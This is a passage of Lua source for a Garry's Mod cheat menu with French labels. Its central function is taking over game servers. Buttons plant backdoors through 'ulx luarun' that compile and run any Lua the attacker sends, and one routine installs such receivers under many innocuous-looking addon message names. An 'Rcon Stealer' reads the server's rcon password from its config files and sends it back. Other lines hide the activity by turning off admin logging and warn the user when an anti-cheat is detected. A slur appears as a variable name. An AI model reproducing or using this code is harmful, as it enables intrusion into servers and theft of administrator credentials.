commandpersotext.OnEnter = function( self )
chat.AddText( self:GetValue() )	-- print the form's text as server text
end

local commandperso = vgui.Create("DButton", BackdoorsMenu)
commandperso:SetSize( 103, 30 )
commandperso:SetPos( 380, 252 )
commandperso:SetText("Commande Perso.")
commandperso:SetTextColor(Color(255, 255, 255, 255))
commandperso.Paint = function(panel, w, h)
if commandperso:IsHovered() then
surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 255, 255)
surface.DrawOutlinedRect(0, 0, w, h)
else
surface.SetDrawColor(0, 0, 0 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
end
commandperso.DoClick = function()

LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( 'fijiconn' ) net.Receive( 'fijiconn', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )

local cbd = BD.CurrentBackdoor if !BD.Backdoors[cbd] then NOTIFICATIONNO( "Veuillez séléctionner une backdoor présente") return end
NOTIFICATION("Commande personnalisée lançé avec sucès")
net.Start(bdactivname)
net.WriteString( commandpersotext:GetText() )
net.WriteBit (1)
net.SendToServer()

end


local luarunback = vgui.Create("DButton", BackdoorsMenu)
luarunback:SetSize( 103, 60 )
luarunback:SetPos( 485, 252 )
luarunback:SetText("Lancer backdoor")
luarunback:SetTextColor(Color(255, 255, 255, 255))
luarunback.Paint = function(panel, w, h)
if luarunback:IsHovered() then
surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 255, 255)
surface.DrawOutlinedRect(0, 0, w, h)
else
surface.SetDrawColor(0, 0, 0 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
end
luarunback.DoClick = function()
NOTIFICATION("Tentative de lancement des backdoors...")
LocalPlayer():ConCommand( [[ulx rcon ulx logecho 0]] )
timer.Simple( 0.5, function()
LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString( 'fijiconn' ) net.Receive( 'fijiconn', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )" )
end )
timer.Simple( 1, function() LocalPlayer():ConCommand( [[ulx rcon ulx logecho 0]] ) end )
timer.Simple( 0.5, function() if BD.IsMessagePooled( BD.GetActive().Netkey ) then NOTIFICATION("Backdoor lançé ✔") LocalPlayer():ConCommand("fiji_clearbd") LocalPlayer():ConCommand("fiji_sv_existmen 0")
else LocalPlayer():ConCommand("fiji_clearbd") LocalPlayer():ConCommand("fiji_sv_existmen 0")end end )
if not LocalPlayer():IsSuperAdmin() then
NOTIFICATIONNO("Vous n'etes pas Superadmin")
else
NOTIFICATION( "Veuillez vérifier les backdoors")
end
end

local rconstealerh = vgui.Create("DButton", BackdoorsMenu)
rconstealerh:SetSize( 101, 60 )
rconstealerh:SetPos( 590, 252 )
rconstealerh:SetText("Rcon Stealer")
rconstealerh:SetTextColor(Color(255, 255, 255, 255))
rconstealerh.Paint = function(panel, w, h)
if rconstealerh:IsHovered() then
surface.SetDrawColor(50, 50, 50 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 255, 255)
surface.DrawOutlinedRect(0, 0, w, h)
else
surface.SetDrawColor(0, 0, 0 ,150)
surface.DrawRect(0, 0, w, h)
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
end
rconstealerh.DoClick = function()
local cbd = BD.CurrentBackdoor if !BD.Backdoors[cbd] then NOTIFICATIONNO( "Veuillez séléctionner une backdoor présente") return end
NOTIFICATION("Recherche en cours...")
status = ValidNetString("jeveuttonrconleul")
local rcon = [[
util.AddNetworkString("rcon_passw_dump")
util.AddNetworkString("jeveuttonrconleul")
util.AddNetworkString("aucun_rcon_ici")
net.Receive( "jeveuttonrconleul", function()
local RconPassword
if file.Exists("cfg/server.cfg", "GAME") then
for k, v in pairs(string.Explode("\n", file.Read("cfg/server.cfg", "GAME"))) do
if string.find(v, "rcon_password") then
RconPassword = v
end
end
end
if not RconPassword and file.Exists("cfg/autoexec.cfg", "GAME") then
for k, v in pairs(string.Explode("\n", file.Read("cfg/autoexec.cfg", "GAME"))) do
if string.find(v, "rcon_password") then
RconPassword = v
end
end
end
if RconPassword ~= nil then
net.Start("rcon_passw_dump")
net.WriteString(RconPassword)
net.Broadcast()
else
net.Start("aucun_rcon_ici")
net.Broadcast()
end
end)
]]
local cbd = BD.CurrentBackdoor
net.Start(bdactivname)
net.WriteString( rcon )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if status then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
NOTIFICATIONNO("Rcon Password non-trouvé. Réessayez, sinon assurez-vous qu'il y ai une backdoor sur le serveur")
end
end)
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
NOTIFICATION("RCON copier")
chat.AddText(Color(255, 255, 255), "Rcon Password du serveur :", Color(0, 255, 0),rcon_pass)
SetClipboardText( rcon_pass )
end )
net.Receive( "aucun_rcon_ici", function()
NOTIFICATIONNO("Pas de RCON Password dans le server.cfg")
end )
local moonman = vgui.Create( "DTextEntry", BackdoorsMenu )
moonman:SetPos( 380, 330 )
moonman:SetSize( 311, 30 )
moonman:SetText( backdoorargs )
moonman.OnChange = function( self )
backdoorargs = self:GetValue()
end
local target1 = vgui.Create("DButton", BackdoorsMenu)
target1:SetSize( 99, 20 )
target1:SetPos( 62, 368 )
target1:SetText("Tous")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
if target1:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 50))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 100))
end
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( selectedplayers, p ) then
table.insert( selectedplayers, p )
end
end
end
local target2 = vgui.Create("DButton", BackdoorsMenu)
target2:SetSize( 99, 20 )
target2:SetPos( 170, 368 )
target2:SetText("Aucun")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
if target2:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 50))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 100))
end
end
target2.DoClick = function()
table.Empty( selectedplayers )
end
local target2 = vgui.Create("DButton", BackdoorsMenu)
target2:SetSize( 99, 20 )
target2:SetPos( 277, 368 )
target2:SetText("Moi")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
if target2:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(150, 150, 150, 50))
else
draw.RoundedBox( 0, 0, 0, w, h, Color(0, 0, 0, 100))
end
end
target2.DoClick = function()
table.Empty( selectedplayers )
table.insert( selectedplayers, LocalPlayer() )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 314, 15 )
plypanel2.Paint = function() -- Paint function
draw.RoundedBoxEx(8,1,1,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 150), false, false, false, false)
if table.HasValue( selectedplayers, v ) then draw.RoundedBoxEx(0,0,0,plypanel2:GetWide(),plypanel2:GetTall(),Color(150, 150, 150, 50), false, false, false, false)
else draw.RoundedBoxEx(0,0,0,plypanel2:GetWide(),plypanel2:GetTall(),Color(0, 0, 0, 50), false, false, false, false) end
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 0 )
plyname:SetFont( "ptiycheat_homemini" )
local tcol = Color( 255, 255, 255 )

if fiji_style_menu:GetInt() == 2 then
if v == LocalPlayer() then tcol = Color( math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75) ) end

elseif fiji_style_menu:GetInt() == 3 then
if v == LocalPlayer() then tcol = Color( 255, 91, 91 ) end

elseif fiji_style_menu:GetInt() == 1 then
if v == LocalPlayer() then tcol = HSVToColor( CurTime() % 6 * 60, 1, 0.5 )end

else
if v == LocalPlayer() then tcol = Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) end



end
plyname:SetColor( tcol )
plyname:SetText( v:Nick().."              "..v:SteamID().."                "..v:Team() )
plyname:SetSize(314, 15)
local faggot = vgui.Create("DButton", plypanel2)
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( selectedplayers, v ) then
table.RemoveByValue( selectedplayers, v )
else
table.insert( selectedplayers, v )
end
end
PlistAllPlayer:AddItem( plypanel2 )
end

BD.GenerateBackdoorList( PlistAll, 1 )
BD.GenerateBackdoorList( PlistAllOnePlayer, 2 )
BD.GenerateBackdoorList( PlistAllDestruction, 3 )
else
local TextHomeza2 = vgui.Create( "DPanel", BackdoorsMenu )
TextHomeza2:SetSize(1000,650)
TextHomeza2.Paint = function( self, w, h )
draw.SimpleText("SNTE détecté. Risque de ban", "ptiycheat_home3", 330, 235, Color(255, 74, 74,255), 0, 1)
draw.SimpleText("Backdoors désactivés", "ptiycheat_home2", 430, 265, Color(255, 255, 255,200), 0, 1)
end
end

print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
print( "Backdoors check" )
print( "Check terminé" )

end)


concommand.Add("azazazaza", function()

LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'BuyCar' ) net.Receive( 'BuyCar', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'rpi_trade_end' ) net.Receive( 'rpi_trade_end', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'ClickerForceSave' ) net.Receive( 'ClickerForceSave', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'SRequest' ) net.Receive( 'SRequest', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'ArmorButton' ) net.Receive( 'ArmorButton', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'Client_To_Server_OpenEditor' ) net.Receive( 'Client_To_Server_OpenEditor', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'wordenns' ) net.Receive( 'wordenns', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'BuyKey' ) net.Receive( 'BuyKey', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'casinokit_chipexchange' ) net.Receive( 'casinokit_chipexchange', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'PurchaseWeed' ) net.Receive( 'PurchaseWeed', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'DoDealerDeliver' ) net.Receive( 'DoDealerDeliver', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'sendDuelInfo' ) net.Receive( 'sendDuelInfo', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'InviteMember' ) net.Receive( 'InviteMember', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'newTerritory' ) net.Receive( 'newTerritory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'CreateOrganization' ) net.Receive( 'CreateOrganization', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'ChangeOrgName' ) net.Receive( 'ChangeOrgName', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")
LocalPlayer():ConCommand("ulx luarun util.AddNetworkString( 'IS_SubmitSID_C2S' ) net.Receive( 'IS_SubmitSID_C2S', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )")

end)

function BD:Fun( pContent )


local BDMenuFun = vgui.Create("DPanel", pContent)
BDMenuFun:SetSize( 539, 388 )
BDMenuFun:SetPos( 0, 0 )
BDMenuFun.Paint = function( self, w, h)
draw.RoundedBox( 0, 0, 0, w, h, Color(255,35,35,0 ) )
draw.SimpleText("En développement", "DermaDefault", 350, 180, Color(255, 255, 255,100), 0, 1)

draw.RoundedBox( 0, 20, 102, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 20, 290, w - 307, 2, Color( 50,50,50, 255 ) )

draw.RoundedBox( 200, 20, 10, 2, h - 20, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 250, 10, 2, h - 20, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 20, 378, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 20, 10, w - 452, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 165, 10, w - 453, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Utilitaires", "ptiycheat_home3", 110, 10, Color(100, 100, 100,255), 0, 1)

--[[draw.RoundedBox( 200, 515, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 282, 10, 2, h - 216, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 180, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 10, w - 435, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 417, 10, w - 440, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Troll", "ptiycheat_home3", 390, 10, Color(100, 100, 100,255), 0, 1)

draw.RoundedBox( 200, 515, 205, 2, h - 213, Color( 50,50,50, 255 ) )
draw.RoundedBox( 200, 282, 205, 2, h - 213, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 378, w - 307, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 284, 205, w - 440, 2, Color( 50,50,50, 255 ) )
draw.RoundedBox( 0, 425, 205, w - 448, 2, Color( 50,50,50, 255 ) )
draw.SimpleText("Autres", "ptiycheat_home3", 386, 205, Color(100, 100, 100,255), 0, 1)]]--

if fiji_style_menu:GetInt() == 2 then
draw.RoundedBox( 0, 0, 242, 2, h - 242, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
draw.RoundedBox( 0, 0, 0, 2, h - 190, Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )

elseif fiji_style_menu:GetInt() == 1 then
draw.RoundedBox( 0, 0, 242, 2, h - 242, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )
draw.RoundedBox( 0, 0, 0, 2, h - 190, HSVToColor( CurTime() % 6 * 60, 1, 0.5 ) )

else
draw.RoundedBox( 0, 0, 242, 2, h - 242, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
draw.RoundedBox( 0, 0, 0, 2, h - 190, Color( fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt(), 255 ) )
end

end


-- bhop
local btnbhop = BD:CreateBtn( "BHOP", 30, 30, 65, 25, pContent )
function btnbhop:DoClick() if fiji_fun_bunnyhop:GetInt() == 1 then surface.PlaySound( fiji_ptiycheatclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_bunnyhop:GetInt() == 1 then RunConsoleCommand( "fiji_fun_bunnyhop", 0 ) else RunConsoleCommand( "fiji_fun_bunnyhop", 1 )  end end
function btnbhop:Think() if fiji_fun_bunnyhop:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

-- end bhop


--spam l

local btnspamlight = BD:CreateBtn( "SPAM LAMPE", 98, 30, 75, 25, pContent )
function btnspamlight:DoClick() if fiji_fun_spamlight:GetInt() == 1 then surface.PlaySound( fiji_ptiycheatclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_spamlight:GetInt() == 1 then RunConsoleCommand( "fiji_fun_spamlight", 0 ) else RunConsoleCommand( "fiji_fun_spamlight", 1 )  end end
function btnspamlight:Think() if fiji_fun_spamlight:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end


--spam l end

local btnbhop = BD:CreateBtn( "FOLIE", 176, 30, 65, 25, pContent )
function btnbhop:DoClick() if fiji_fun_spamrope:GetInt() == 1 then surface.PlaySound( fiji_ptiycheatclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_spamrope:GetInt() == 1 then RunConsoleCommand( "fiji_fun_spamrope", 0 ) else RunConsoleCommand( "fiji_fun_spamrope", 1 )  end end
function btnbhop:Think() if fiji_fun_spamrope:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end




local tablename1 = { "Joe", "John", "Jack", "Barry", "Chris", "Christopher", "Michael", "David", "Thomas", "Paul", "Tony", "Mark", "Cooper", "Jared", "James", "Jimmy", "Bob", "Robert", "Riley", "William", "Will", "Donald", "George", "Ken", "Steve", "Bruce", "Brian", "Chad", "Anthony", "Tim", "Eddie", "Daniel", "Larry", "Jeff", "Justin", "Adam", "Ralph", "Brandon", "Xavier", "Greg", "Gordon", "Scott", "Taine", "Howie", "Morgan", "Curtis", "Dwayne", "Steven", "Peter", "Kevin", "Coleman", "Garry", }
local tablename2 = { "Houston", "Burch", "Smith", "Jones", "Trump", "Sanders", "Abbott", "Cruise", "Brown", "Hopgood", "Davis", "Miller", "Wilson", "Walker", "Lee", "Lions", "Bryant", "Hall", "Adams", "Green", "Aldridge", "Turner", "Anderson", "Morris", "Howard", "Swanson", "Peterson", "Powell", "Keating", "Rudd", "Coleman", "Cunningham", "Donnell", "Callaghan", "Smithers", "Burns", "Bonds", "Gonzales", "Griffin", "Woods", "Gibson", "Webb", "Simpson", "Freeman", "Mcdonald", "Butters", "Masterson", "Keefe", "Sanderson", "Badger", "Cantrip", "Williams", "DontBanMe", "Lopez", "Clark", "Campbell", "King", "Coleman", "Chongs", "Riviera", "Ward", "Gray", "Ross", }

local btnnomrandom = BD:CreateBtn( "NOM RANDOM", 55, 70, 76, 25, pContent )
function btnnomrandom:DoClick() LocalPlayer():ConCommand("say /name "..table.Random( tablename1 ).." "..table.Random( tablename1 )) end

local btnnommort = BD:CreateBtn( "VUE TPS", 134, 70, 75, 25, pContent )
function btnnommort:DoClick() if fiji_fun_thperson:GetInt() == 1 then surface.PlaySound( fiji_ptiycheatclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_thperson:GetInt() == 1 then RunConsoleCommand( "fiji_fun_thperson", 0 ) else RunConsoleCommand( "fiji_fun_thperson", 1 )  end end
function btnnommort:Think() if fiji_fun_thperson:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end



local btnnommort = BD:CreateBtn( "CROSSHAIR", 98, 110, 75, 25, pContent )
function btnnommort:DoClick() if fiji_fun_crosshair:GetInt() == 1 then surface.PlaySound( fiji_ptiycheatclick ) else surface.PlaySound( "buttons/button15.wav" ) end if fiji_fun_crosshair:GetInt() == 1 then RunConsoleCommand( "fiji_fun_crosshair", 0 ) else RunConsoleCommand( "fiji_fun_crosshair", 1 )  end end
function btnnommort:Think() if fiji_fun_crosshair:GetInt() == 1 then self.activebtn = true  else self.activebtn = false end end

local pPmopi = vgui.Create( "DPanel", pContent )
pPmopi:SetPos( 30, 140 )
pPmopi:SetSize( 212, 50 )
function pPmopi:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "TAILLE CROSSHAIR", "ptiycheat_home5", 7, h / 2, color_white, 0, 1 )
end
local pDistancemopi = vgui.Create( "DNumSlider", pContent )
pDistancemopi:SetPos( 85, 140 )
pDistancemopi:SetSize( 180, 50 )
pDistancemopi:SetText( "" )
pDistancemopi:SetMin( -15 )
pDistancemopi:SetMax( 120 )
pDistancemopi:SetDecimals( 0 )
pDistancemopi:SetValue( fiji_fun_crosshairtaille:GetInt())
pDistancemopi.Scratch:SetVisible( false )
pDistancemopi.TextArea:SetTextColor( color_white )
function pDistancemopi.Slider:Paint(w, h)
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(0, 21, w, h / 5) local parent = self:GetParent() local barw = w * ( (parent:GetValue() - parent:GetMin()) / parent:GetRange() )
if fiji_style_menu:GetInt() == 2 then
surface.SetDrawColor(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75))
surface.DrawRect(0, 21, barw, h / 5)

elseif fiji_style_menu:GetInt() == 1 then
surface.SetDrawColor(HSVToColor( CurTime() % 6 * 60, 1, 0.5 ))
surface.DrawRect(0, 21, barw, h / 5)

else
surface.SetDrawColor(fiji_menu_princ_color:GetInt(),fiji_menu_sec_color:GetInt(),fiji_menu_th_color:GetInt())
surface.DrawRect(0, 21, barw, h / 5)
end
end
function pDistancemopi:SetHeight(tall)
self.Slider.Knob:SetHeight(tall / 2 + 4)
DSlider.SetHeight(self, tall)
pDistancemopi.SetTall = pDistancemopi.SetHeight
pDistancemopi.Slider.Knob:SetTall(5)
end
function pDistancemopi.Slider.Knob:Paint(w, h)
derma.SkinHook( "Paint", "Button", self, 0, 0 )
end
function pDistancemopi:OnValueChanged( val )
RunConsoleCommand( "fiji_fun_crosshairtaille", tonumber( self:GetValue() ) )
end



local ColorMenucross = vgui.Create( "DPanel", pContent )
ColorMenucross:SetSize( 220, 50 )
ColorMenucross:SetPos( 26, 195 )
function ColorMenucross:Paint( w, h )
draw.RoundedBox( 0, 0, 0, w, h, Color( 110,110,110, 20 ) )
draw.SimpleText( "Couleur Crosshair", "ptiycheat_home5", 79, 8, color_white, 0, 1 )
end
local OptionsColorRedMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorRedMENU:SetPos( 1,20 )
OptionsColorRedMENU:SetSize( 20, 20 )
OptionsColorRedMENU:SetText( " " )
OptionsColorRedMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(183, 0, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 81, 81))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorRedMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 238")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 61")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 61")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorOrangeMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorOrangeMENU:SetPos( 23,20 )
OptionsColorOrangeMENU:SetSize( 20, 20 )
OptionsColorOrangeMENU:SetText( " " )
OptionsColorOrangeMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(211, 116, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 165, 56))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorOrangeMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 255")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 162")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 91")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorYellowMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorYellowMENU:SetPos( 45,20 )
OptionsColorYellowMENU:SetSize( 20, 20 )
OptionsColorYellowMENU:SetText( " " )
OptionsColorYellowMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(193, 190, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(255, 253, 160))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorYellowMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 246")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 255")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 91")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorGreenMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorGreenMENU:SetPos( 67,20 )
OptionsColorGreenMENU:SetSize( 20, 20 )
OptionsColorGreenMENU:SetText( " " )
OptionsColorGreenMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(2, 178, 0))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(119, 255, 117))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorGreenMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 130")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 255")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 132")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorBlueMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorBlueMENU:SetPos( 89,20 )
OptionsColorBlueMENU:SetSize( 20, 20 )
OptionsColorBlueMENU:SetText( " " )
OptionsColorBlueMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(0, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(117, 121, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorBlueMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 104")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 102")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 255")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPurpleMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorPurpleMENU:SetPos( 111,20 )
OptionsColorPurpleMENU:SetSize( 20, 20 )
OptionsColorPurpleMENU:SetText( " " )
OptionsColorPurpleMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(144, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(191, 109, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
OptionsColorPurpleMENU.DoClick = function()
LocalPlayer():ConCommand("fiji_fun_crosshaircolor1 168")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor2 102")
LocalPlayer():ConCommand("fiji_fun_crosshaircolor3 255")
LocalPlayer():ConCommand("fiji_fun_crosshaircolortype 0")
surface.PlaySound( fiji_ptiycheathover )

end
end
local OptionsColorPinkMENU = vgui.Create( "DButton", ColorMenucross )
OptionsColorPinkMENU:SetPos( 133,20 )
OptionsColorPinkMENU:SetSize( 20, 20 )
OptionsColorPinkMENU:SetText( " " )
OptionsColorPinkMENU.Paint = function( self, w, h )
if self:IsHovered() then
draw.RoundedBox(0,0,0,w,h,Color(250, 0, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
else
draw.RoundedBox( 0, 0, 0, w, h, Color(252, 96, 255))
surface.SetDrawColor(255, 255, 255 ,100)
surface.DrawOutlinedRect(0, 0, w, h)
end
